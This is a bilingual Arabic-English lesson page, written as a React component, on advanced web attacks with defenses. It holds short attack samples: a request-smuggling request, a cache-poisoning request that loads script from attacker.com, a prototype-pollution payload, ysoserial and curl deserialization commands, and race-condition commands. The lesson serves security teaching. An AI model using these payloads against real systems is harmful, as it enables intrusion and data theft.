"use client";
import { LessonShell, Section, Callout, Code, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="advanced-web">
      <L
        ar={<>
          <Section title="الويب على مستوى الخبراء">
            <p>عرفت SQLi؟ XSS؟ IDOR؟ تمام.</p>
            <p>- طب أنا حافظ Top 10، يبقى أنا web hacker مظبوط؟</p>
            <p>يا مستجد. الـ Top 10 ده الأبجدية. إحنا هنا بنقرا أدب.</p>
            <p>طب لما الـ frontend والـ backend يختلفوا في تفسير نفس الـ HTTP request؟</p>
            <p>طب لما تخدع الـ cache يخزّن صفحة الضحية الشخصية (بكل بياناته جواها)، وتيجي إنت بعدها تطلبها بنفس الـ URL وتلاقيها قدامك جاهزة؟</p>
            <p>طب لما تمرّر CRLF في header فتحقن response جديد بالكامل؟</p>
            <Analogy>
              في الـ OWASP Top 10، الثغرة بتبقى في كود المبرمج — هو كاتب <code>SELECT * FROM users WHERE id = $input</code> من غير ما يـ sanitize. تمام، الغلطة واضحة، والإصلاح واضح.
              <br/><br/>
              هنا في الدرس ده، المبرمج كاتب كوده صح. مفيش غلطة في كوده هو.
              <br/>
              الثغرة عايشة في الفجوة بين <b>الـ components</b> اللي طلبه ماشي بينهم: الـ CDN، الـ load balancer، الـ reverse proxy، الـ backend. كل واحد منهم منتج شركة مختلفة، وكل واحد قارا الـ RFC وفهمه بطريقته الخاصة.
              <br/><br/>
              تخيّل خطاب بيوصلك من السفارة. مرّ على 4 موظفين قبل ما يوصلك:
              <br/>
              الأول قراه إن الموعد يوم الأحد، التاني قراه يوم الاتنين، التالت ختمه على الأحد، الرابع وقّع على الاتنين.
              <br/>
              المهاجم بيستغل الفرق ده. بيبعت طلب HTTP الـ frontend بيقراه على إنه طلب واحد، والـ backend بيقراه على إنه اتنين. أو الـ cache بيخزّنه كصفحة عامة، والـ origin بيرجّعها كصفحة شخصية.
              <br/><br/>
              <b>الكود مش غلط. الفهم بين الأطراف هو اللي غلط.</b> والمهاجم بيعيش في الفجوة دي.
            </Analogy>
            <Callout kind="danger" title="إذن رسمي فقط">
              كل التكنيكات هنا ضمن اختبارات اختراق رسمية (red team / bug bounty).
              تطبيقها على هدف من غير تفويض = جريمة فيدرالية تحت CFAA.
              مش "خلي بالك" — ده "هتدخل سجن".
            </Callout>
          </Section>

          <Section title="حكاية: PortSwigger Top 10 of 2019 — Request Smuggling رجع من الموت">
            <Callout kind="info" title="بُص بقى">
              James Kettle (Albinowax) في 2019 رجّع تكنيك من 2005 كان الناس فاكراه مات. اللي بيحصل فعلياً؟ في 6 شهور، Bug bounty payouts بأكتر من نص مليون دولار من شركات عملاقة (Slack, PayPal, Atlassian).
              الثغرة الأصلية اتنشرت في 2005 من Watchfire. الناس قالوا "حُلّت".
              في 2019: HTTP/2 و CDN-frontends جداد جابوها تاني، بأضعاف القوة.
            </Callout>
            <p>الدرس: الثغرات القديمة ما بتموتش — بترجع كل ما الـ stack يتغيّر. اللي اتعلم البروتوكول من الجذر، بيلاقي الثغرات قبل ما تتنشر.</p>
          </Section>

          <Section title="HTTP Request Smuggling — لما الـ frontend والـ backend يختلفوا">
            <Analogy>تخيل فيه حارسين بينك وبين البنك: واحد عند البوابة (frontend/proxy) وواحد جوه الصالة (backend). كل واحد بيعد الزوار بطريقة مختلفة. لو بعتّ اتنين ملصوقين، الأول هيشوفهم واحد، والاتنين هيدخلوا. ده بالظبط الـ Request Smuggling.</Analogy>
            <h3>أنواع الـ desync</h3>
            <ul>
              <li><b>CL.TE</b> — الـ frontend يستخدم Content-Length، الـ backend يستخدم Transfer-Encoding.</li>
              <li><b>TE.CL</b> — العكس.</li>
              <li><b>TE.TE</b> — كلاهما يدعمان TE لكن يفسّران obfuscation بشكل مختلف.</li>
              <li><b>HTTP/2 → HTTP/1 downgrade</b> — frontend HTTP/2 يحوّل لـ backend HTTP/1.</li>
              <li><b>H2.CL / H2.TE</b> — تهريب عبر HTTP/2 mismatched headers.</li>
            </ul>
            <Code lang="CL.TE classic">{`POST / HTTP/1.1
Host: target.gov
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
            <p>الـ frontend بيقرا الـ 13 بايت كرسالة واحدة. الـ backend بيشوف chunked → 0 = خلاص نهاية، وبيعتبر <code>SMUGGLED</code> أول الرسالة <i>اللي بعدها</i> من ضحية حقيقية. مين هي الضحية؟ أي حد جاي وراك في نفس الـ connection.</p>
            <h3>هتعمل بيها إيه؟</h3>
            <ul>
              <li>تسرق session cookies لليوزرز اللي جايين بعدك.</li>
              <li>تسمم الـ cache.</li>
              <li>تتخطى access controls اللي على الـ frontend.</li>
              <li>تحقن XSS على ضحايا تانيين.</li>
              <li>تسرق كل الـ headers بما فيهم الـ Authorization.</li>
            </ul>
            <h3>الكشف والأدوات</h3>
            <ul>
              <li><b>HTTP Request Smuggler</b> (Burp extension by Albinowax).</li>
              <li><b>smuggler.py</b> (defparam).</li>
              <li><b>h2cSmuggler</b>.</li>
              <li>Burp Repeater مع timing differential analysis.</li>
            </ul>
            <Callout kind="good" title="الحماية">
              <ol>
                <li>HTTP/2 من الأول للآخر (مفيش downgrade للـ backend).</li>
                <li>ارفض أي request جاي بـ Content-Length و Transfer-Encoding مع بعض.</li>
                <li>الـ frontend والـ backend من نفس الـ vendor ونفس الإصدار.</li>
                <li>استخدم <b>haproxy/nginx h2-mode strict</b>.</li>
                <li>راقب الـ logs على حجم body مختلف عن الـ Content-Length.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="HTTP/2 و gRPC — جبهة جديدة بالكامل">
            <ul>
              <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS عبر فتح streams و إغلاقها فوراً.</li>
              <li><b>HPACK bombs</b> — header compression للضغط على الـ memory.</li>
              <li><b>CONTINUATION flood (CVE-2024-27316)</b> — frames بلا END_HEADERS.</li>
              <li>gRPC: تجاوز auth بـ <code>:authority</code> override، deserialization في الـ Protobuf.</li>
            </ul>
          </Section>

          <Section title="Server-Side Cache Poisoning">
            <Analogy>الـ CDN/cache زي أمين مكتبة بيحفظ نسخة من كل كتاب اتطلب. لو لعبتها صح وخليته يحفظ "كتاب مزيف" تحت اسم كتاب أصلي، كل اللي هيطلبه بعد كدة هيلاقي المزيف. الفرق بينك وبينه إنك لعبت في "اسم الكتاب" مش في الكتاب نفسه.</Analogy>
            <Code lang="payload">{`# 1) ابحث عن header غير مدرج في الـ cache key
GET / HTTP/1.1
Host: target.gov
X-Forwarded-Host: attacker.com

# 2) لو الموقع يعكس X-Forwarded-Host في الـ HTML/JS:
<script src="//attacker.com/main.js">

# 3) الـ cache يحفظ النتيجة. كل زائر تالٍ يحمّل JS من المهاجم.`}</Code>
            <p>الأداة: <b>Param Miner</b> (Burp) عشان تكتشف الـ unkeyed inputs.</p>
            <Callout kind="good" title="الحماية">
              متعكسش headers مش موثوقة في الرد. ضيف كل header مؤثر للـ <code>Vary</code> أو للـ cache key. وطبّق
              <b> normalization</b> صارم على مستوى الـ CDN.
            </Callout>
          </Section>

          <Section title="Web Cache Deception — المرايا">
            <p>عكس الـ Cache Poisoning بالظبط: هنا إنت بتخدع الـ cache يحفظ صفحة <b>خاصة</b> بيوزر معين كأنها static.</p>
            <Code lang="payload">{`# المستخدم لديه /account => يُرجع بياناته الشخصية
# المهاجم يرسل له رابط:
https://target.gov/account/photo.css

# الـ proxy يرى ".css" => يحفظها كـ static
# المهاجم يفتح نفس الرابط => يحصل على بيانات الضحية`}</Code>
          </Section>

          <Section title="Prototype Pollution — JavaScript">
            <p>في JavaScript، كل object بيورث من <code>Object.prototype</code>. لو لوّثت الـ prototype ده، إنت لوّثت كل object في التطبيق دفعة واحدة.</p>
            <Code lang="JavaScript — vulnerable merge">{`// كود hashmap بسيط
function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') merge(target[k], source[k]);
    else target[k] = source[k];
  }
}

// payload في JSON body
{ "__proto__": { "isAdmin": true } }

// الآن: ({}).isAdmin === true لكل object في التطبيق!`}</Code>
            <p>فيه Gadget chains معروفة على Express وLodash وjQuery بتحول الـ PP لـ RCE كامل.</p>
            <p>الأدوات: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
            <Callout kind="good" title="الحماية">
              <ul>
                <li>استخدم <b>Map</b> و <b>Object.create(null)</b> بدل الـ plain objects.</li>
                <li>اعمل <b>Object.freeze(Object.prototype)</b> في الـ entrypoint.</li>
                <li>في Node.js: شغّل بـ <code>--disable-proto=delete</code>.</li>
                <li>Lint بـ <b>eslint-plugin-security</b> + <b>semgrep</b>.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Insecure Deserialization — سلاسل الـ Gadgets">
            <p>الـ gadget chain هو ترتيب لكلاسات موجودة فعلاً في الـ classpath، لو فككت الـ deserialization بترتيب معين، الكلاسات نفسها بتنفذ كود من غير ما إنت تكتب سطر. إنت بتستخدم سلاحه عليه.</p>
            <h3>الأشهر في الميدان</h3>
            <TwoCol>
              <Card title="Java" color="red">
                ysoserial — CommonsCollections1, Spring, Groovy, Hibernate.
                <br />ysoserial.net للـ .NET.
              </Card>
              <Card title="Python" color="red">
                pickle، PyYAML قبل safe_load — استخدم <code>__reduce__</code>.
              </Card>
              <Card title="PHP" color="red">
                phpggc — Laravel, Symfony, WordPress, Doctrine chains.
              </Card>
              <Card title=".NET" color="red">
                BinaryFormatter, NetDataContractSerializer — مع ysoserial.net.
              </Card>
            </TwoCol>
            <Code lang="ysoserial — Java">{`# توليد payload يستغل CommonsCollections1 لتنفيذ id
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# يُحقن في أي endpoint يستخدم ObjectInputStream
curl -X POST https://target/api/import \\
  -H "Content-Type: application/x-java-serialized-object" \\
  --data-binary @payload.bin`}</Code>
            <Callout kind="good" title="الحماية">
              <ul>
                <li>متعملش deserialization على داتا جاية من بره أصلاً. ده الحل الصح.</li>
                <li>لو مضطر: whitelist صارم للـ classes (LookAheadObjectInputStream).</li>
                <li>خليك مرقع: Java SerialFilter، Microsoft AppDomainSwitches.</li>
                <li>استخدم JSON Schema / Protobuf بدل الـ native serialization.</li>
                <li>لو لازم تستخدمها بين خدماتك الداخلية بس، وقّع الـ payloads بـ HMAC.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="OAuth & SSO — هجمات القفل الذهبي">
            <ul>
              <li><b>Account takeover via dangling redirect_uri</b> — تسجل subdomain منتهية وتستخدمها redirect.</li>
              <li><b>OAuth covert redirect</b> — redirect_uri فيه open redirect.</li>
              <li><b>SAML XSW (Signature Wrapping)</b> — تلعب في الـ XML بحيث التوقيع يتحقق على جزء، ويتقرا جزء تاني خالص.</li>
              <li><b>JWT confused deputy</b> — توكن جاي من issuer تاني بيتقبل لأن محدش بيفحص الـ <code>iss</code>.</li>
              <li><b>Cross-tenant takeover</b> في SaaS متعدد الـ tenants عن طريق trust بايظ.</li>
            </ul>
          </Section>

          <Section title="GraphQL — هجمات أعمق">
            <Code lang="GraphQL DoS — alias-based">{`{
  a1: user(id:1) { posts { comments { author { posts { comments { ... } } } } } }
  a2: user(id:2) { ... }
  ... 1000 aliases
}`}</Code>
            <ul>
              <li><b>Field suggestions</b> بيكشف الـ schema حتى لو الـ introspection مقفول.</li>
              <li><b>Mutation race conditions</b>: aliases كتير عشان تستهلك نقاط reward قبل ما يتفحصوا.</li>
              <li>auth ضعيف على resolvers معينة لأن حد نسي يحط الفحص.</li>
            </ul>
            <Callout kind="good" title="الحماية">
              query depth limit + cost analysis + rate limit per IP/user + <b>persisted queries</b> بس مفيش غيرها.
            </Callout>
          </Section>

          <Section title="Race Conditions — ثواني بتكلف ملايين">
            <Analogy>تخيل ATM فيه عيب: تضغط Withdraw مرتين بسرعة قبل ما الرصيد يتحدث، يطلع لك المبلغ مرتين. ده race condition / TOCTOU — وقت الفحص مش هو وقت الاستخدام.</Analogy>
            <Code lang="exploit">{`# 50 طلب متزامن لاستخدام كوبون تخفيض مرة واحدة
turbo-intruder + race-single-packet attack
# أو
GO + curl --parallel
ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
            <ul>
              <li><b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) بيبعت عشرات الـ requests في TCP packet واحدة.</li>
              <li>التأثير: سحب رصيد متكرر، تخطي email verification، حجز اسم يوزر محجوز لحد تاني.</li>
            </ul>
            <Callout kind="good" title="الحماية">
              <ol>
                <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
                <li>Idempotency keys على كل عملية حساسة.</li>
                <li>Atomic decrement (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>).</li>
                <li>Distributed locks (Redis, Zookeeper) لما تحتاج.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="إزاي تصطاد ثغرات حقيقية؟">
            <ol>
              <li><b>اقرا الكود لو قادر</b>: source review &gt;&gt; black-box. مفيش مقارنة.</li>
              <li><b>اطلع بره الـ checklist</b>: OWASP خطوة واحدة، الإبداع باقي السكة.</li>
              <li><b>افهم الـ business logic</b>: أغلى الثغرات بتختبي هنا، مش في الـ payload.</li>
              <li><b>وصّل الثغرات ببعض</b>: SSRF صغير + open redirect + IDOR = اختراق كامل.</li>
              <li><b>وثّق proof-of-impact</b> بشكل واضح للـ blue team.</li>
            </ol>
          </Section>

          <Section title="غلطات الـ junior في الويب المتقدم">
            <Callout kind="danger" title="اللي بيحصل">
              <ul>
                <li><b>يجرّب smuggling payloads عشوائي</b> — من غير ما يفهم الـ frontend والـ backend اللي قدامه. الـ payload بتاع CL.TE مش هيشتغل على HTTP/2 endpoint.</li>
                <li><b>يقول "Race condition" على كل حاجة</b> — في فرق بين race حقيقي وبين "السيرفر استجاب مرتين مع بعض". لازم تثبت impact.</li>
                <li><b>يفتكر إن CSP بتقفل XSS</b> — الـ CSP فيها 1000 bypass: JSONP endpoints, base-uri, dangling markup. اقرا CSP Evaluator قبل ما تقول "محمي".</li>
                <li><b>ينسى الـ secondary context</b> — SSTI ممكن تطلع في email templates، PDF generators، error pages. مش بس الـ main view.</li>
                <li><b>يبلّغ بـ "تكنيك" بدل "impact"</b> — "لقيت CRLF" مش finding. "لقيت CRLF بستخدمه أحقن Set-Cookie فأسرق session" دي finding.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>الويب المتقدم مش تقنيات أكتر — هو فهم أعمق.</p>
            <p>كل bug class هنا (smuggling, cache poisoning, SSTI, race conditions) بتطلع من نفس المبدأ: <b>اتنين components بيختلفوا في تفسير نفس البيانات</b>.</p>
            <p>اللي بيتعلم المبدأ، بيلاقي الـ bug في أي stack.</p>
            <p>اللي بيحفظ payloads، بيلاقي الـ bugs اللي اتنشرت — ومش بيلاقي حاجة جديدة أبداً.</p>
            <p>اكتبها على غلاف الكشكول:</p>
            <p><b>الثغرة بتعيش في الفجوة بين اتنين components بيختلفوا في الفهم. دوّر على الفجوة، مش على الـ payload.</b></p>
          </Section>
        </>}
        en={<>
          <Section title="Web at the expert level">
            <Analogy>OWASP Top 10 is the alphabet. This lesson is grammar and literature. We deal with vulnerabilities beyond "inject a value" — we play at the protocol and architectural layer where developers assume "the stack protects itself".</Analogy>
            <Callout kind="danger" title="Authorized use only">
              Every technique here is for formal pentests (red team / bug bounty). Using them on a target without
              authorization is a federal offense.
            </Callout>
          </Section>

          <Section title="HTTP Request Smuggling — disagreement between frontend and backend">
            <Analogy>Imagine two guards between you and the bank: one at the gate (frontend/proxy) and one in the lobby (backend). Each counts "visitors" differently. If you send two people stitched together, the first sees one — and both walk in. That's request smuggling.</Analogy>
            <h3>Desync variants</h3>
            <ul>
              <li><b>CL.TE</b> — frontend uses Content-Length, backend uses Transfer-Encoding.</li>
              <li><b>TE.CL</b> — the reverse.</li>
              <li><b>TE.TE</b> — both support TE but parse obfuscation differently.</li>
              <li><b>HTTP/2 → HTTP/1 downgrade</b> — frontend HTTP/2 translates to backend HTTP/1.</li>
              <li><b>H2.CL / H2.TE</b> — smuggling via HTTP/2 mismatched headers.</li>
            </ul>
            <Code lang="CL.TE classic">{`POST / HTTP/1.1
Host: target.gov
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
            <p>Frontend reads the full 13 bytes as one message. Backend sees chunked → 0 = end, treating <code>SMUGGLED</code> as the start of the <i>next</i> real victim's request.</p>
            <h3>Impact</h3>
            <ul>
              <li>Hijacking session cookies of upcoming users.</li>
              <li>Cache poisoning.</li>
              <li>Bypassing frontend access controls.</li>
              <li>Stored XSS against other victims.</li>
              <li>Stealing all headers including Authorization.</li>
            </ul>
            <h3>Detection and tooling</h3>
            <ul>
              <li><b>HTTP Request Smuggler</b> (Burp extension by Albinowax).</li>
              <li><b>smuggler.py</b> (defparam).</li>
              <li><b>h2cSmuggler</b>.</li>
              <li>Burp Repeater + timing differential analysis.</li>
            </ul>
            <Callout kind="good" title="Defense">
              <ol>
                <li>HTTP/2 end-to-end (no downgrade to backend).</li>
                <li>Reject requests with both Content-Length and Transfer-Encoding.</li>
                <li>Frontend and backend from the same vendor and version.</li>
                <li>Use <b>haproxy/nginx h2-mode strict</b>.</li>
                <li>Log and alert on body-size != Content-Length.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="HTTP/2 and gRPC — fresh attack surface">
            <ul>
              <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS via opening and immediately resetting streams.</li>
              <li><b>HPACK bombs</b> — header compression to exhaust memory.</li>
              <li><b>CONTINUATION flood (CVE-2024-27316)</b> — frames without END_HEADERS.</li>
              <li>gRPC: auth bypass via <code>:authority</code> override, Protobuf deserialization.</li>
            </ul>
          </Section>

          <Section title="Server-Side Cache Poisoning">
            <Analogy>The CDN/cache is a librarian who keeps a copy of every book requested. Trick them into storing a "fake book" under a real title and every subsequent request gets the fake.</Analogy>
            <Code lang="payload">{`# 1) Find a header NOT in the cache key
GET / HTTP/1.1
Host: target.gov
X-Forwarded-Host: attacker.com

# 2) If the site reflects X-Forwarded-Host into HTML/JS:
<script src="//attacker.com/main.js">

# 3) The cache stores it. Every visitor loads attacker JS.`}</Code>
            <p>Tool: <b>Param Miner</b> (Burp) for discovering unkeyed inputs.</p>
            <Callout kind="good" title="Defense">
              Never reflect untrusted headers. Add every impactful header to <code>Vary</code> or the cache key. Apply
              strict <b>normalization</b> at the CDN.
            </Callout>
          </Section>

          <Section title="Web Cache Deception">
            <p>The mirror of cache poisoning: trick the cache into storing a user's <b>private</b> page as if it were static.</p>
            <Code lang="payload">{`# /account returns the user's personal data
# Attacker sends them a link:
https://target.gov/account/photo.css

# The proxy sees ".css" => caches it as static
# Attacker visits the same URL => gets the victim's data`}</Code>
          </Section>

          <Section title="Prototype Pollution — JavaScript">
            <p>In JS every object inherits from <code>Object.prototype</code>. Polluting it = affecting every object in the app.</p>
            <Code lang="JavaScript — vulnerable merge">{`function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') merge(target[k], source[k]);
    else target[k] = source[k];
  }
}

// JSON body payload
{ "__proto__": { "isAdmin": true } }

// Now: ({}).isAdmin === true for every object!`}</Code>
            <p>Known gadget chains in Express, Lodash, jQuery escalate PP into RCE.</p>
            <p>Tools: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Use <b>Map</b> and <b>Object.create(null)</b> instead of plain objects.</li>
                <li><b>Object.freeze(Object.prototype)</b> at the entrypoint.</li>
                <li>Run Node.js with <code>--disable-proto=delete</code>.</li>
                <li>Lint with <b>eslint-plugin-security</b> + <b>semgrep</b>.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Insecure Deserialization — gadget chains">
            <p>A deserialization gadget chain is a sequence of classes already present in the classpath that, when deserialized in a particular order, executes code.</p>
            <h3>Famous tools</h3>
            <TwoCol>
              <Card title="Java" color="red">
                ysoserial — CommonsCollections1, Spring, Groovy, Hibernate.
                <br />ysoserial.net for .NET.
              </Card>
              <Card title="Python" color="red">
                pickle, PyYAML before safe_load — abuse <code>__reduce__</code>.
              </Card>
              <Card title="PHP" color="red">
                phpggc — Laravel, Symfony, WordPress, Doctrine chains.
              </Card>
              <Card title=".NET" color="red">
                BinaryFormatter, NetDataContractSerializer — used with ysoserial.net.
              </Card>
            </TwoCol>
            <Code lang="ysoserial — Java">{`# Generate a payload exploiting CommonsCollections1 to run id
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Inject into any endpoint using ObjectInputStream
curl -X POST https://target/api/import \\
  -H "Content-Type: application/x-java-serialized-object" \\
  --data-binary @payload.bin`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Avoid deserializing untrusted data at all.</li>
                <li>If unavoidable: strict class whitelisting (LookAheadObjectInputStream).</li>
                <li>Stay patched: Java SerialFilter, Microsoft AppDomainSwitches.</li>
                <li>Prefer JSON Schema / Protobuf over native serialization.</li>
                <li>If used between internal services only, sign payloads (HMAC).</li>
              </ul>
            </Callout>
          </Section>

          <Section title="OAuth & SSO abuse — golden-key attacks">
            <ul>
              <li><b>Account takeover via dangling redirect_uri</b> — register an expired subdomain and use it as redirect.</li>
              <li><b>OAuth covert redirect</b> — redirect_uri pointing to an open redirect.</li>
              <li><b>SAML XSW (Signature Wrapping)</b> — XML manipulation so the signature validates one part while another is consumed.</li>
              <li><b>JWT confused deputy</b> — token from another issuer accepted because <code>iss</code> isn't validated.</li>
              <li><b>Cross-tenant takeover</b> in multi-tenant SaaS via misconfigured trust.</li>
            </ul>
          </Section>

          <Section title="GraphQL — deeper attacks">
            <Code lang="GraphQL DoS — alias-based">{`{
  a1: user(id:1) { posts { comments { author { posts { comments { ... } } } } } }
  a2: user(id:2) { ... }
  ... 1000 aliases
}`}</Code>
            <ul>
              <li><b>Field suggestions</b> leak the schema even with introspection disabled.</li>
              <li><b>Mutation race conditions</b>: aliasing to spend reward points before validation.</li>
              <li>Weak auth on individual resolvers because someone forgot a check.</li>
            </ul>
            <Callout kind="good" title="Defense">
              Query depth limit + cost analysis + per-user/IP rate limiting + <b>persisted queries only</b>.
            </Callout>
          </Section>

          <Section title="Race Conditions — seconds that cost millions">
            <Analogy>Imagine an ATM bug: hit Withdraw twice fast, before the balance updates, and you get the cash twice. That's a TOCTOU race — Time of Check ≠ Time of Use.</Analogy>
            <Code lang="exploit">{`# 50 concurrent attempts to redeem a single-use coupon
turbo-intruder + race-single-packet attack
# or
GO + curl --parallel
ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
            <ul>
              <li><b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) sends dozens of requests in one TCP packet.</li>
              <li>Impacts: duplicate withdrawals, bypassing email verification, claiming a reserved username.</li>
            </ul>
            <Callout kind="good" title="Defense">
              <ol>
                <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
                <li>Idempotency keys on every sensitive operation.</li>
                <li>Atomic decrement (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>).</li>
                <li>Distributed locks (Redis, Zookeeper) where needed.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="A methodology for finding real vulnerabilities">
            <ol>
              <li><b>Read the source if possible</b>: source review &gt;&gt; black-box.</li>
              <li><b>Step outside the checklist</b>: OWASP is one move; creativity is the rest.</li>
              <li><b>Understand the business logic</b>: the most valuable bugs hide here, not in the payload.</li>
              <li><b>Chain bugs</b>: a tiny SSRF + open redirect + IDOR = full compromise.</li>
              <li><b>Document a clear proof-of-impact</b> for the blue team.</li>
            </ol>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
